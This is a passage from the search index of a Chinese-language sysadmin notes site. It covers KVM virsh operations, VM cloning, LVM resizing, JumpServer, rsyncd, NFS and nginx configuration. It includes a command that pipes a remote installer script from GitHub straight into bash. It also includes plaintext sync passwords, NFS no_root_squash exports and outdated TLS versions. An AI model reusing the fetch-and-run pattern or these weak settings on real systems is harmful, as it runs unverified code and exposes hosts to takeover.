\u5173\u673a\nvirsh destroy vm_name   \u5f3a\u5236\u5173\u95ed\u7535\u6e90 \nvirsh undefine vm_name  \u79fb\u9664\u865a\u62df\u673a\nvirsh suspend vm_name   \u6682\u505c\u865a\u62df\u673a\nvirsh resume vm_name    \u6062\u590d\u865a\u62df\u673a\nvirsh autostart vm_name \u8bbe\u7f6e\u968f\u5f00\u673a\u542f\u52a8 # \u751f\u6210\u6210\u8f6f\u94fe /etc/libvirt/qemu/autostart/vm_server.xml \nvirsh autostart --disable vm_name \u53d6\u6d88\u968f\u5f00\u673a\u542f\u52a8\n</code></pre>"},{"location":"daily/42-kvm/#12","title":"1.2 \u6269\u5bb9","text":""},{"location":"daily/42-kvm/#121-cpu","title":"1.2.1 CPU","text":"<pre><code>virsh help domain\n\n# \u67e5\u770b\u4fe1\u606f\nvirsh dominfo UAT-BIGDATA-000\n\n# \u66f4\u6539CPU\uff08\u91cd\u542f\u751f\u6548\uff09\nvirsh setvcpus UAT-BIGDATA-000 4 --maximum --config\nvirsh setvcpus UAT-BIGDATA-000 4 --config\nvirsh shutdown UAT-BIGDATA-000\n\nvirsh setvcpus UAT-BIGDATA-000 4 --current\nvirsh start UAT-BIGDATA-000\n\n# \u9700\u8981\u91cd\u542f\nvirsh define UAT-BIGDATA-000.xml\nvirsh reboot UAT-BIGDATA-000\n</code></pre>"},{"location":"daily/42-kvm/#122","title":"1.2.2 \u5185\u5b58","text":"<pre><code># \u67e5\u770b\u4fe1\u606f\nvirsh dominfo UAT-BIGDATA-000\n\n# \u66f4\u6539\u5185\u5b58\uff08\u9700\u8981\u5173\u673a\u4fee\u6539\uff09\nvirsh shutdown UAT-BIGDATA-000\n\nvirsh setmaxmem UAT-BIGDATA-000 8388608 --config\nvirsh dominfo UAT-BIGDATA-000\nvirsh start UAT-BIGDATA-000\n\n# \u66f4\u6539\u5185\u5b58\uff08\u5f00\u673a\u72b6\u6001\u65f6\u751f\u6548--\u524d\u63d0maxmem\u4ee5\u5185\u53d8\u66f4\uff09\nvirsh setmem UAT-BIGDATA-000 4194304 --live --config\n\n# \u9700\u8981\u91cd\u542f\nvirsh define UAT-BIGDATA-000.xml\nvirsh reboot UAT-BIGDATA-000\n</code></pre>"},{"location":"daily/42-kvm/#123","title":"1.2.3 \u78c1\u76d8","text":"<p>\u78c1\u76d8\u7c7b\u578b\u6709 <code>qcow2</code> \u548c <code>raw</code>\uff0c\u9ed8\u8ba4\u662f<code>raw</code></p> <pre><code># \u521b\u5efa\u78c1\u76d8\nqemu-img create -f qcow2 /data/lib/kvm/UAT-BIGDATA-000-SDB.img 100G\n\n# \u6302\u8f7d\u78c1\u76d8\uff08\u9700\u8981\u5b9e\u4f8b\u5728\u8fd0\u884c\u4e2d\uff09\nvirsh attach-disk \\\n    UAT-BIGDATA-000 \\\n    /data/lib/kvm/UAT-BIGDATA-000-SDB.img \\\n    sdb \\\n    --cache none \\\n    --targetbus scsi \\\n    --subdriver qcow2 \\\n    --live \\\n    --config \n\nmkfs.xfs /dev/sdb &amp;&amp; blkid /dev/sdb\n\necho 'UUID=903a6ade-c1ab-4593-9ac2-293afdb1ed55 /data xfs     defaults        0 0' &gt;&gt; /etc/fstab\n\nmkdir -p /data &amp;&amp; mount -a\n\n# \u5206\u79bb\u78c1\u76d8\nvirsh detach-disk UAT-BIGDATA-000 /data/lib/kvm/UAT-BIGDATA-000-SDB.img\n\n# \u6269\u5bb9\u539f\u78c1\u76d8\uff08\u9700\u8981\u505c\u673a\uff09\nqemu-img resize /data/lib/kvm/UAT-BIGDATA-000-SDB.img +20G\n# virt-resize --expand /dev/sda1 \nlsblk\nvgdisplay\nlvdisplay\nlvextend -L +20G /dev/centos/root\n\n# ext \u7cfb\u7edf\u683c\u5f0f\u4f7f\u7528\uff1a\nresize2fs /dev/centos/root\n# xfs \u7cfb\u7edf\u683c\u5f0f\u4f7f\u7528\u4e0b\u9762\u547d\u4ee4\nxfs_growfs /dev/centos/root\n\n# LVM\u64cd\u4f5c\u96c6\u9526\n## \u8ffd\u52a0\u4e00\u4e2a\u4e3b\u5206\u533a\nfdisk /dev/vda\n p\n m\n n #+\u5206\u533a \u9009\u62e9\u4e3b\u5206\u533a p\n w\npartprobe # \u5185\u6838\u91cd\u65b0\u52a0\u8f7d\n\n# vg \u8ffd\u52a0 pv\uff0clv \u6269\u5c55\npvcreate /dev/vda4\nvgextend vg /dev/vda4\nlvextend --extents +100%FREE /dev/mapper/vg-lv_data1\nmount -a\nxfs_growfs /dev/mapper/vg-lv_data1\n</code></pre>"},{"location":"daily/42-kvm/#13","title":"1.3 \u514b\u9686","text":""},{"location":"daily/42-kvm/#131","title":"1.3.1 \u901a\u7528\u64cd\u4f5c","text":"<pre><code># METHOD AUTO\uff08\u9700\u8981\u5173\u673a\uff09\n# -o \u65e7\u865a\u62df\u673a\n# -n \u65b0\u865a\u62df\u673a\n# virt-clone --auto-clone -o old-vm-server -n new-vm-server\n# e.g.\n# virt-clone --auto-clone -o UAT-BIGDATA-000 -n UAT-BIGDATA-001\n\nvirt-clone --auto-clone -o old-vm-server -n new-vm-server \\\n    -f /data/lib/kvm/new-vm-server-SDA.img \\\n    -m 52:54:0A:01:02:33\n\n# METHOD MANUAL\n# \u5907\u4efd\u78c1\u76d8\u6587\u4ef6\ncp old-vm-server.qcow2 new-vm-server.qcow2 \n# \u5bfc\u51fa\u914d\u7f6e\u6587\u4ef6\nvirsh dumpxml old-vm-server &gt; new-vm-server.xml\n# \u7f16\u8f91\u914d\u7f6e\u6587\u4ef6\uff1a\u4fee\u6539\u540d\u79f0\u3001\u79fb\u9664UUID\u3001\u4fee\u6539\u78c1\u76d8\u6587\u4ef6\u540d\u3001\u5220\u9664MAC\u5730\u5740\nvim new-vm-server.xml\n# \u5bfc\u5165\u914d\u7f6e\u6587\u4ef6\nvirsh define new-vm-server.xml \n# \u542f\u52a8\u865a\u62df\u673a\nvirsh start new-vm-server\n</code></pre>"},{"location":"daily/42-kvm/#132","title":"1.3.2 \u6279\u91cf\u514b\u9686","text":"<pre><code>## \u5982\u514b\u96865\u53f0\u673a\u5668\na=20\nb=46\nfor i in {1..5}\ndo\nvirt-clone --auto-clone -o UAT-STUDY-020 -n UAT-STUDY-0$((i+a)) \\\n    -f /data/lib/kvm/UAT-STUDY-0$((i+a))-SDA.img \\\n    -m 52:54:0A:01:02:$((i+b))\nmv /data/lib/kvm/UAT-STUDY-020-SDB-clone.img /data/lib/kvm/UAT-STUDY-0$((i+a))-SDB.img\nsed -i 's/UAT-STUDY-020-SDB-clone.img/UAT-STUDY-0'$((i+a))'-SDB.img/' UAT-STUDY-0$((i+a)).xml\nvirsh define UAT-STUDY-0$((i+a)).xml\ndone\n</code></pre>"},{"location":"daily/42-kvm/#133","title":"1.3.3 \u4fee\u6539\u4fe1\u606f","text":"<pre><code>mv /data/lib/kvm/UAT-STUDY-020-SDB-clone.img /data/lib/kvm/UAT-STUDY-0YY-SDB.img\n\nhostnamectl set-hostname UAT-STUDY-0YY --transient\nhostnamectl set-hostname UAT-STUDY-0YY --static\nhostnamectl set-hostname UAT-STUDY-0YY --pretty\n\nsed -i 's/10.1.2.70/10.1.2.77/' /etc/sysconfig/network-scripts/ifcfg-eth0\n</code></pre>"},{"location":"daily/42-kvm/#14","title":"1.4 \u7b14\u8bb0","text":""},{"location":"daily/42-kvm/#141-cpu","title":"1.4.1 \u514b\u9686+CPU+\u5185\u5b58","text":"<pre><code># create machine PRD-SLB-NGINX-02\nvirt-clone --auto-clone -o TEMPLATE -n PRD-SLB-NGINX-02 \\\n    -f /data/lib/kvm/PRD-SLB-NGINX-01-SDA.img \\\n    -m 52:54:0A:01:01:37\n\nmv /data/lib/kvm/TEMPLATE-SDB-clone.img /data/lib/kvm/PRD-SLB-NGINX-02-SDB.img\nsed -i 's/TEMPLATE-SDB-clone.img/PRD-SLB-NGINX-02-SDB.img/' /etc/libvirt/qemu/PRD-SLB-NGINX-02.xml\nvirsh define /etc/libvirt/qemu/PRD-SLB-NGINX-02.xml\n\nvirsh setvcpus  PRD-SLB-NGINX-02 4 --maximum --config\nvirsh setvcpus  PRD-SLB-NGINX-02 4 --config\nvirsh setmaxmem PRD-SLB-NGINX-02 8388608 --config\n\nvirsh setvcpus PRD-SLB-NGINX-02 4 --current\nvirsh start    PRD-SLB-NGINX-02\n\nvirsh setmem    PRD-SLB-NGINX-02 8388608 --live --config\nvirsh dominfo   PRD-SLB-NGINX-02\nvirsh autostart PRD-SLB-NGINX-02\nvirsh console   PRD-SLB-NGINX-02\n\nhostnamectl set-hostname PRD-SLB-NGINX-02 --transient\nhostnamectl set-hostname PRD-SLB-NGINX-02 --static\nhostnamectl set-hostname PRD-SLB-NGINX-02 --pretty\nsed -i 's/10.10.10.10/10.1.1.55/' /etc/sysconfig/network-scripts/ifcfg-eth0\ncat /etc/sysconfig/network-scripts/ifcfg-eth0\n\nreboot\n</code></pre>"},{"location":"daily/42-kvm/#142-cpu","title":"1.4.2 \u514b\u9686+CPU+\u5185\u5b58+\u78c1\u76d8","text":"<pre><code># create machine PRD-KUBENODE-103 \nvirt-clone --auto-clone -o TEMPLATE -n PRD-KUBENODE-103 \\\n    -f /data/lib/kvm/PRD-KUBENODE-103-SDA.img \\\n    -m 52:54:0A:01:01:38\n\nmv /data/lib/kvm/TEMPLATE-SDB-clone.img /data/lib/kvm/PRD-KUBENODE-103-SDB.img\nsed -i 's/TEMPLATE-SDB-clone.img/PRD-KUBENODE-103-SDB.img/' /etc/libvirt/qemu/PRD-KUBENODE-103.xml\nvirsh define /etc/libvirt/qemu/PRD-KUBENODE-103.xml\n\nvirsh setvcpus  PRD-KUBENODE-103 8 --maximum --config\nvirsh setvcpus  PRD-KUBENODE-103 8 --config\nvirsh setmaxmem PRD-KUBENODE-103 33554432 --config\n\nvirsh setvcpus PRD-KUBENODE-103 8 --current\nvirsh start    PRD-KUBENODE-103\n\nvirsh setmem    PRD-KUBENODE-103 33554432 --live --config\nvirsh dominfo   PRD-KUBENODE-103\nvirsh autostart PRD-KUBENODE-103\nvirsh console   PRD-KUBENODE-103\n\nip a\nhostnamectl set-hostname PRD-KUBENODE-103 --transient\nhostnamectl set-hostname PRD-KUBENODE-103 --static\nhostnamectl set-hostname PRD-KUBENODE-103 --pretty\nsed -i 's/10.1.1.100/10.1.1.56/' /etc/sysconfig/network-scripts/ifcfg-eth0\ncat /etc/sysconfig/network-scripts/ifcfg-eth0\n\nvirsh shutdown PRD-KUBENODE-103\nqemu-img resize /data/lib/kvm/PRD-KUBENODE-103-SDB.img +400G\nvirsh start PRD-KUBENODE-103\n\nvirsh console PRD-KUBENODE-103\nxfs_growfs /dev/sda\n</code></pre>"},{"location":"daily/42-kvm/#_2","title":"\u4e8c\u3001\u756a\u5916\u64cd\u4f5c","text":"<p>\u7f51\u7edc\u76f8\u5173</p>"},{"location":"daily/42-kvm/#21-nat","title":"2.1 NAT","text":"<p>\u4e00\u822c\u53cc\u7f51\u5361\u7528\u4e8e NAT \u4e0a\u7f51</p> <pre><code># \u53cc\u7f51\u5361\u6865\u63a5\u5185\u7f51\u4e0a\u7f51\n# \u5f00\u542f\u8f6c\u53d1\nsysctl -w net.ipv4.ip_forward=1\n\n# \u6253\u5f00NAT\uff08\u5176\u4e2d em1 \u4e3a\u4e0a\u7f51\u7f51\u5361\uff09\niptables -t nat -A POSTROUTING -o em1 -j MASQUERADE\n\n# \u8bbe\u7f6e\u8def\u7531\uff08\u5185\u7f51\u7f51\u5361 eth1: 10.1.2.109 \u4e3a\u5185\u7f51\u7f51\u6bb5\u8def\u7531\u7f51\u5173\uff09\n# \u5728\u5185\u7f51\u7f51\u6bb5server\u4e0a\u66ff\u6362\u9ed8\u8ba4\u8def\u7531\nip r del default via 10.1.2.1\nip r add default via 10.1.2.109\n</code></pre>"},{"location":"daily/42-kvm/#22-bondbridge","title":"2.2 BOND+BRIDGE","text":"<pre><code># bond0 em1 &amp; em2\n# cat ifcfg-bond0 \nTYPE=Ethernet\nBOOTPROTO=none\nIPV6INIT=no\nDEVICE=bond0\nNAME=bond0\nDEVICE=bond0\nONBOOT=yes\nBRIDGE=br0\n\n# cat ifcfg-em1\nDEVICE=em1\nBOOTPROTO=none\nMASTER=bond0\nSLAVE=yes\nONBOOT=yes\n\n# cat ifcfg-em2\nDEVICE=em2\nBOOTPROTO=none\nMASTER=bond0\nSLAVE=yes\nONBOOT=yes\n\n# cat ifcfg-br0 \nDEVICE=br0\nBOOTPROTO=static\nONBOOT=yes\nTYPE=Bridge\nDELAY=0\nIPADDR=10.1.1.109\nPREFIX=24\nGATEWAY=10.1.1.254\nDNS1=10.1.1.2\n\n# cat /etc/modprobe.d/bonding.conf \nalias bond0 bonding\noptions bond0 miimon=100 mode=0\n\n# \u52a0\u8f7d\u5e76\u8bbe\u7f6e\u968f\u5f00\u673a\u542f\u52a8\nmodeprobe bonding \nifenslave bond0 em1 em2\n</code></pre>"},{"location":"daily/43-jumpserver/","title":"jumpServer","text":"<p>Reference</p>"},{"location":"daily/43-jumpserver/#_1","title":"\u4e00\u3001\u6548\u679c\u9884\u89c8","text":"<ul> <li>https://jumpserver.8ops.top</li> <li>http://jumpserver.8ops.top/api/docs</li> </ul> <p><code>jesse2021</code></p> <p></p> <p>\u7ec8\u7aef\u767b\u5f55</p> <pre><code># default ssh port 2222\nssh -p2222 jesse@10.101.11.236\n</code></pre> <p></p>"},{"location":"daily/43-jumpserver/#_2","title":"\u4e8c\u3001\u5b89\u88c5\u65b9\u5f0f","text":""},{"location":"daily/43-jumpserver/#21-helm","title":"2.1 Helm","text":"<p><code>unsucess</code></p> <ul> <li>MySQL</li> <li>Redis</li> </ul> <pre><code>helm repo add jumpserver https://jumpserver.github.io/helm-charts\nhelp repo update jumpserver\nhelm search repo jumpserver\nhelm show values jumpserver/jumpserver &gt; jumpserver.yaml-2.26.1-default\n\n# Example\n#    https://m.8ops.top/attachment/jumpserver/helm/jumpserver.yaml-2.26.1\n# \n\nhelm install jumpserver jumpserver/jumpserver \\\n    -f jumpserver.yaml-2.26.1 \\\n    -n kube-server \\\n    --version 2.26.1 \\\n    --debug\n\nhelm -n kube-server uninstall jumpserver\n</code></pre>"},{"location":"daily/43-jumpserver/#22-onekey","title":"2.2 OneKey","text":"<pre><code># \u9ed8\u8ba4\u4f1a\u5b89\u88c5\u5230 /opt/jumpserver-installer-v2.26.1 \u76ee\u5f55\ncurl -sSL https://github.com/jumpserver/jumpserver/releases/download/v2.26.1/quick_start.sh | bash\n\ncd /opt/jumpserver-installer-v2.26.1\n\n# tree jumpserver/config/\njumpserver/config/\n\u251c\u2500\u2500 config.txt\n\u251c\u2500\u2500 core\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 config.yml\n\u251c\u2500\u2500 koko\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 config.yml\n\u251c\u2500\u2500 mariadb\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 mariadb.cnf\n\u251c\u2500\u2500 mysql\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 my.cnf\n\u251c\u2500\u2500 nginx\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 cert\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 server.crt\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 server.key\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 lb_http_server.conf\n\u2514\u2500\u2500 redis\n    \u2514\u2500\u2500 redis.conf\n\n# \u7ef4\u62a4\njmsctl stop \njmsctl start \njmsctl status\n</code></pre>"},{"location":"daily/44-rsyncd/","title":"rsyncd","text":""},{"location":"daily/44-rsyncd/#server","title":"\u4e00\u3001server","text":"<pre><code>apt install rsync\nyum install rsync \n\ncat &gt; /etc/rsyncd.conf &lt;&lt;EOF\n# /etc/rsyncd: configuration file for rsync daemon mode\n\n# See rsyncd.conf man page for more options.\n\n# configuration example:\n\nuid = 0\ngid = 0\nuse chroot = yes\nmax connections = 10\npid file = /var/run/rsyncd.pid\n# exclude = lost+found/\n# transfer logging = yes\n# timeout = 900\n# ignore nonreadable = yes\n# dont compress   = *.gz *.tgz *.zip *.z *.Z *.rpm *.deb *.bz2\nread only = yes\n\n[filestorage]\n       path = /data1/filestorage\n       auth users = sync\n       secrets file = /etc/rsyncd/rsyncd.secrets\n       comment = filestorage dir\n\nEOF\n\ncat &gt;/etc/rsyncd/rsyncd.secrets &lt;&lt;EOF\nsync:jesse\nEOF\nchmod 600 /etc/rsyncd/rsyncd.secrets\n\nsystemctl daemon-reload\nsystemctl enable rsync\nsystemctl start  rsync\nsystemctl status rsync\n</code></pre>"},{"location":"daily/44-rsyncd/#client","title":"\u4e8c\u3001client","text":"<pre><code>RSYNC_PASSWORD=jesse \\\n  /usr/bin/rsync \\\n  --bwlimit=4000 \\\n  -av \\\n  --delete \\\n  --exclude-from=/opt/scripts/sync.exclude sync@10.1.9.174::filestorage/ /data1/filestorage/\n\nOR\n\n/usr/bin/rsync \\\n  --bwlimit=4000 \\\n  -av \\\n  --delete \\\n  --password-file=/opt/scripts/sync.password \\\n  --exclude-from=/opt/scripts/sync.exclude sync@10.1.9.174::filestorage/ /data1/filestorage/\n\ncat &gt; /opt/scripts/sync.password &lt;&lt;EOF\njesse\nEOF\nchmod 600 /opt/scripts/sync.password\n\ncat &gt; /lib/systemd/system/sync-filestorage.service &lt;&lt;EOF\n[Unit]\nDescription=Sync filestorage\nConditionPathExists=/opt/scripts/sync.password\n\n[Service]\nExecStart=/opt/scripts/sync_filestorage.sh\nRestartSec=10\nRestart=on-failure\n\n[Install]\nWantedBy=multi-user.target\nEOF\n\nsystemctl daemon-reload\nsystemctl start sync-filestorage\nsystemctl enable sync-filestorage\nsystemctl status sync-filestorage\n</code></pre> <pre><code>cat &gt; /lib/systemd/system/filestorage.service &lt;&lt;EOF\n[Unit]\nDescription=filestorage server daemon\nDocumentation=\nAfter=network.target\nWants=\n\n[Service]\nType=simple\nExecStart=/data1/go/bin/filestorage_run -listenAddr 0.0.0.0:18080 -rootPath /data1/filestorage\nKillMode=process\nRestart=on-failure\nRestartSec=42s\n\n[Install]\nWantedBy=multi-user.target\nEOF\n\n\nsystemctl daemon-reload\nsystemctl start  filestorage\nsystemctl enable filestorage\nsystemctl status filestorage\n</code></pre> <p>\u5feb\u6377\u4f7f\u7528</p> <pre><code># view \u221a\nRSYNC_PASSWORD=jesse rsync -av --list-only sync@10.101.11.236::share/\nRSYNC_PASSWORD=jesse rsync -av --list-only share/ sync@10.101.11.236::share/\n\n# put \u221a\nRSYNC_PASSWORD=jesse rsync -av --list-only share/ sync@10.101.11.236::share/\nrsync -av --list-only --password-file=sync.password share/ sync@10.101.11.236::share/\n</code></pre>"},{"location":"daily/44-rsyncd/#_1","title":"\u4e09\u3001\u95ee\u9898","text":""},{"location":"daily/44-rsyncd/#31","title":"3.1 \u62a5\u6743\u9650\u95ee\u9898","text":"<pre><code># \u73b0\u8c61\n[rsync\u62a5\u9519\uff1arsync: chgrp \u201c.initial-setup-ks.cfg.jaXlVz\u201d (in backup) failed: Operation not permitted (1)]\n\n# \u89e3\u51b3\n# \u5c06 rsync -av source/ sync@addr::target/ \u53d8\u66f4\n# \u4e3a rsync -rtlv source/ sync@addr::target/\n# \u662f\u56e0\u4e3a -a \u62e5\u6709\u5f52\u6863\u529f\u80fd\n# \u53e6\u9700\u8981\u4fee\u590dtarget\u76ee\u5f55\u7684\u6743\u9650\uff0c\u6b64\u524d\u64cd\u4f5c\u4f1a\u5c06\u6743\u9650\u53d8\u66f4\n</code></pre>"},{"location":"daily/45-nfs/","title":"nfs","text":""},{"location":"daily/45-nfs/#_1","title":"\u4e00\u3001\u5b89\u88c5","text":""},{"location":"daily/45-nfs/#11-centos","title":"1.1 CentOS","text":"<pre><code># Server[CentOS]\nmkdir -p /data1/lib/nfs-data\nchown -R nfsnobody:nfsnobody /data1/lib/nfs-data\n\nyum install rpcbind nfs-utils \n\nvim /etc/exports\n/data1/lib/nfs-data 10.101.0.0/16(no_root_squash,rw,async,no_subtree_check)\n\n# \u4f7f\u914d\u7f6e\u751f\u6548\nexportfs -a\n\nsystemctl start rpcbind nfs-utils nfs\nsystemctl enable rpcbind nfs-utils nfs\nsystemctl is-enabled rpcbind nfs-utils nfs\nsystemctl status rpcbind nfs-utils nfs\n\nshowmount -e 10.101.11.236 \n\nsystemctl restart rpcbind nfs-utils nfs\nsystemctl status  rpcbind nfs-utils nfs\n\nshowmount -e 10.101.9.179\n\n# Client [CentOS]\nyum install nfs-utils \nmkdir -p /data1/lib/nfs-data\nchown -R nobody:nogroup /data1/lib/nfs-data\n\nvim /etc/fstab\n10.101.9.179:/data1/lib/nfs-data /data1/lib/nfs-data nfs4 defaults 0 0\n\nmount -a\n\nmount -t nfs4 10.101.11.236:/data1/lib/nfs-data /data1/lib/nfs-data\n\nrpcinfo -p 10.101.9.179\n</code></pre>"},{"location":"daily/45-nfs/#12-ubuntu","title":"1.2 Ubuntu","text":"<pre><code># Server[Ubuntu]\nmkdir -p /data1/lib/nfs\nchown -R nobody:nogroup /data1/lib/nfs\n\napt install rpcbind libnfs-utils nfs-common\napt install nfs-kernel-server\n\nvim /etc/exports\n/opt/lib/nfs 10.101.0.0/16(no_root_squash,rw,async,no_subtree_check)\n\n# \u4f7f\u914d\u7f6e\u751f\u6548\nexportfs -a\n\nsystemctl start rpcbind nfs-utils nfs-kernel-server\nsystemctl enable rpcbind nfs-utils nfs-kernel-server\nsystemctl is-enabled rpcbind nfs-utils nfs-kernel-server\nsystemctl status rpcbind nfs-utils nfs-kernel-server\n\nsystemctl restart rpcbind nfs-utils nfs-kernel-server\nsystemctl status rpcbind nfs-utils nfs-kernel-server\n\nshowmount -e 10.101.11.236\n\n# Client[Ubuntu]\napt install nfs-common\nmkdir -p /opt/lib/nfs\nchown -R nfsnobody:nfsnobody /data1/lib/nfs\n\nvim /etc/fstab\n10.101.11.236:/data1/lib/nfs /data1/lib/nfs nfs4 defaults 0 0\n\nmount -a\n\nmount -t nfs4 10.101.11.236:/data1/lib/nfs /data1/lib/nfs\n\nrpcinfo -p 10.101.11.236\n</code></pre>"},{"location":"daily/45-nfs/#_2","title":"\u4e8c\u3001\u9ad8\u53ef\u7528","text":""},{"location":"daily/45-nfs/#21-rsync-inotify","title":"2.1 rsync + inotify","text":"<p>Reference</p>"},{"location":"daily/45-nfs/#22-rsync-sersync","title":"2.2 rsync +  sersync","text":"<p>Reference</p>"},{"location":"daily/46-nginx/","title":"nginx","text":""},{"location":"daily/46-nginx/#root","title":"\u4e00\u3001ROOT\u7f8e\u5316","text":""},{"location":"daily/46-nginx/#11","title":"1.1 \u6837\u5f0f\u4e00","text":"<pre><code># server.conf\nserver {\n    listen 48080;\n    root /opt/autoindex;\n    charset utf-8;\n    autoindex on;\n    autoindex_localtime on;\n    autoindex_exact_size off;\n    add_after_body /autoindex.html;\n}\n</code></pre>"},{"location":"daily/46-nginx/#12","title":"1.2 \u6837\u5f0f\u4e8c","text":"<pre><code># server.conf\nserver {\n    listen 48080;\n    root /opt/autoindex;\n    charset utf-8;\n    autoindex on;\n    autoindex_localtime on;\n    autoindex_exact_size off;\n    add_before_body /.autoindex/header.html;\n    add_after_body /.autoindex/footer.html;\n}    \n</code></pre>"},{"location":"daily/46-nginx/#_1","title":"\u4e8c\u3001\u4e3b\u914d\u7f6e","text":"<p><code>nginx.conf</code></p> <pre><code>user  nginx;\nworker_processes  auto;\n\nerror_log  /data/log/nginx/error.log warn;\npid        /var/run/nginx.pid;\n\nevents {\n    use epoll;\n    worker_connections  65535;\n}\n\nhttp {\n    include       /etc/nginx/mime.types;\n    default_type  application/octet-stream;\n\n    log_format logex '{\"timestamp\":\"$time_iso8601\",\"msec\":\"$msec\",\"remote_port\":\"$remote_port\",\"method\":\"$request_method\",\"server_name\":\"$host\",\"uri\":\"$uri\",\"args\":\"$args\",\"server_protocol\":\"$server_protocol\",\"http_user_agent\":\"$http_user_agent\",\"http_referer\":\"$http_referer\",\"http_cookie\":\"$http_cookie\",\"request_time\":\"$request_time\",\"response_time\":\"$upstream_response_time\",\"remote_addr\":\"$remote_addr\",\"upstream_http_location\":\"$upstream_http_location\",\"x_real_ip\":\"$http_x_real_ip\",\"x_forwarded_for\":\"$http_x_forwarded_for\",\"upstream_addr\":\"$upstream_addr\",\"response_code\":\"$status\",\"upstream_response_code\":\"$upstream_status\",\"request_length\":\"$request_length\",\"content_length\":\"$content_length\",\"bytes_sent\":\"$bytes_sent\",\"body_bytes_sent\":\"$body_bytes_sent\",\"scheme\":\"$scheme\"}';\n\n    access_log  /data/log/nginx/access.log  logex;\n\n    # gzip\n    gzip on;\n    gzip_min_length 1k;\n    gzip_buffers 4 16k;\n    gzip_http_version 1.0;\n    gzip_comp_level 6;\n    gzip_types text/plain application/javascript application/x-javascript text/javascript text/xml text/css;\n    gzip_disable \"MSIE [1-6]\\.\";\n    gzip_vary on;\n    underscores_in_headers on;\n\n    sendfile        on;\n    tcp_nopush      on;\n    keepalive_timeout  60;\n    tcp_nodelay     on;\n    charset UTF-8;\n\n    # base\n    server_tokens off;\n    server_names_hash_max_size 1024;\n    server_names_hash_bucket_size 128;\n    client_header_buffer_size 32k;\n    large_client_header_buffers 4 32k;\n    client_max_body_size  50m;\n    client_header_timeout 30;\n    client_body_timeout   30;\n    send_timeout          60;\n    fastcgi_connect_timeout 300;\n    fastcgi_send_timeout 300;\n    fastcgi_read_timeout 1800;\n    fastcgi_buffer_size 64k;\n    fastcgi_buffers 8 128k;\n    fastcgi_busy_buffers_size 128k;\n    fastcgi_temp_file_write_size 128k;\n\n    # temp\n    client_body_temp_path /dev/shm/client_body_temp;\n    fastcgi_temp_path /dev/shm/fastcgi_temp;\n    proxy_temp_path /dev/shm/proxy_temp;\n    scgi_temp_path /dev/shm/scgi_temp;\n    uwsgi_temp_path /dev/shm/uwsgi_temp;\n\n    # proxy\n    proxy_set_header Host $host;\n    proxy_set_header X-Real-IP $remote_addr;\n    proxy_set_header CLIENT_IP $remote_addr;\n    proxy_set_header X-Forwarded-For $remote_addr;\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_connect_timeout 60;\n    proxy_send_timeout 300;\n    proxy_read_timeout 300;\n    proxy_headers_hash_max_size 51200;\n    proxy_headers_hash_bucket_size 6400;\n    proxy_buffer_size 16k;\n    proxy_buffers 8 32k;\n    proxy_busy_buffers_size 128k;\n    proxy_temp_file_write_size 128k;\n    proxy_http_version 1.1;\n    proxy_next_upstream off;\n    server_name_in_redirect off;\n\n    # default 80\n    server {\n        listen 80 default;\n        rewrite ^.*$ https://$host$uri permanent;\n    }\n\n    include conf.d/ops/*.conf;\n    include conf.d/site/*.conf;\n    include conf.d/wiki/*.conf;\n}\n</code></pre>"},{"location":"daily/46-nginx/#21","title":"2.1 \u8bc1\u4e66\u914d\u7f6e","text":"<p><code>ssl/8ops.top</code></p> <pre><code>listen 443 ssl;\nssl_certificate     ssl.d/8ops.top.crt;\nssl_certificate_key ssl.d/8ops.top.key;\nssl_session_timeout 5m;\nssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;\nssl_protocols TLSv1 TLSv1.1 TLSv1.2;\nssl_prefer_server_ciphers on;\n</code></pre>"},{"location":"daily/46-nginx/#22","title":"2.2 \u6d41\u91cf\u7ba1\u7406","text":"<p><code>deny.d/8ops.top</code></p> <pre><code>allow 8.8.8.8/32;\n\ndeny all;\n</code></pre>"},{"location":"daily/46-nginx/#23","title":"2.3 \u7194\u65ad\u7ba1\u7406","text":"<p><code>return</code></p> <pre><code>location / {\n       default_type text/plain;\n       return 403 \"Deny\";\n}\n</code></pre>"},{"location":"daily/46-nginx/#24","title":"2.4 \u5e94\u7528\u914d\u7f6e","text":"<p><code>www.8ops.top.conf</code></p> <pre><code>server {\n    include ssl/8ops.top;\n    server_name www.8ops.top;\n    access_log /data/log/nginx/www.8ops.top_access.log logex;\n    error_log /data/log/nginx/www.8ops.top_error.log;\n    location / {\n        proxy_pass https://10.0.0.1:8080;\n    }\n}\n</code></pre>"},{"location":"daily/46-nginx/#25","title":"2.5 \u6587\u4ef6\u4e0b\u8f7d","text":"<p><code>attachment</code></p> <pre><code>location / {\n        if ($request_filename ~* ^.*?\\.(html|doc|pdf|zip|docx)$) {\n            add_header  Content-Disposition attachment;\n            add_header  Content-Type application/octet-stream;\n        }\n}\n</code></pre>"},{"location":"daily/46-nginx/#26","title":"2.6 \u65e5\u5fd7\u5207\u5272","text":"<p><code>/etc/logrotate.d/nginx</code></p> <pre><code>/data/log/nginx/*.log\n/var/log/nginx/*.log {\n        daily\n        missingok\n        rotate 30\n        compress\n        delaycompress\n        notifempty\n        create 644 nginx adm\n        sharedscripts\n        postrotate\n                if [ -f /var/run/nginx.pid ]; then\n                        kill -USR1 `cat /var/run/nginx.pid`\n                fi\n        endscript\n}\n</code></pre>"},{"location":"daily/46-nginx/#rtmp","title":"\u4e09\u3001RTMP","text":"<p>\u81ea\u5efa\u76f4\u64ad</p> <pre><code>./configure \\\n--user=nginx \\\n--group=nginx \\\n--prefix=/usr/local/nginx-rtmp \\\n--with-pcre=/usr/local/src/pcre2-10.10 \\\n--add-module=/usr/local/src/nginx-rtmp-module-1.1.7 \\\n--add-module=/usr/local/src/nginx-rtmp-module-1.1.7/hls \\\n--add-module=/usr/local/src/nginx-rtmp-module-1.1.7/dash \n\n./configure \\\n--prefix=/usr/local/nginx-rtmp \\\n--add-module=../nginx-rtmp-module-1.1.7 \\\n--with-http_ssl_module 